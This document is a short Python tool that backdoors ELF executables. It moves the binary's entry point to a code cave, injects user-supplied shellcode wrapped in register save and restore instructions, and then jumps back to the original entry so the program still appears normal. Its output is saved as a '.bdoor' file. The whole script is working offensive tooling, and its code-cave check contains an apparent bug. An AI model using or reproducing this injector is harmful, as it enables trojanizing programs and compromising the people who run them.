#!/usr/bin/env python3
# TODO:
# get binary entry point
# rewrite code cave with desired shellcode
# add jmp $entry_point at the end of shellcode
# save output so binary.bdoor
# ???
# Profit!

from argparse import ArgumentParser
from binascii import unhexlify
from ELF import ELF
import struct

prettyHex = lambda x: (hex(x) if isinstance(x, int) else ' '.join(hex(i) for i in x))

def gen_sc_wrapper(legit_e_entry, new_e_entry, shellcode):
    sc_wrapper = b""
    # sc_wrapper += b"\xcc" # bpoint
    sc_wrapper += b"\xcc"
    sc_wrapper += b"\xe8\x00\x00\x00\x00\x54\x50\x53\x51\x52\x55\x56\x57\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57" # pushes
    sc_wrapper += shellcode
    sc_wrapper += b"\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58\x5f\x5e\x5d\x5a\x59\x5b\x58\x5c\x5b\x48\x81\xeb" # popes
    sc_wrapper += new_e_entry
    sc_wrapper += b"\x48\x81\xc3"
    sc_wrapper += legit_e_entry
    sc_wrapper += b"\x53\xc3"
    return sc_wrapper


def get_args():
    p = ArgumentParser()
    p.add_argument("-b", "--binary", help="Binary path to backdoor")
    p.add_argument("-s", "--shellcode", help="Path to the raw shellcode (file)")
    p.add_argument("-l", "--location", help="Hex value of where to put the shellcode")

    return p.parse_args()


def main():
    args = get_args()

    with open(args.binary, "rb") as f:
        binData = f.read()

    elf = ELF(binData)

    with open(args.shellcode, "rb") as f:
        shellcode = f.read()

    loc = int(args.location, 16)

    if elf.ei_mag != b"\x7f\x45\x4c\x46":
        print("[!] Binary is not an ELF file. Exiting...")
        return 1

    safe_cc = True
    for i in (binData[loc], binData[loc]+len(shellcode), 1):
        off = loc+i
        if binData[off] != 0x00:
            print(f"Non null byte found in codecave at offset {prettyHex(off)}: {prettyHex(binData[off])}")
            safe_cc = False

    if not safe_cc:
        print("[!] Warning: selected codecave doesn't only contain null bytes")


    newBinData = b""
    newBinData += binData[:0x18]
    legit_loc  = elf.e_entry
    newBinData += elf.p(loc)
    newBinData += binData[(0x18+len(elf.p(elf.e_entry))):loc]
    sc = gen_sc_wrapper(elf.p(legit_loc), elf.p(loc+5), shellcode)
    newBinData += sc
    newBinData += binData[loc+len(sc):]


    with open(f"./{args.binary.split('/')[-1]}.bdoor", "wb") as f:
        f.write(newBinData)

    return 0



if __name__=='__main__':
    exit(main())
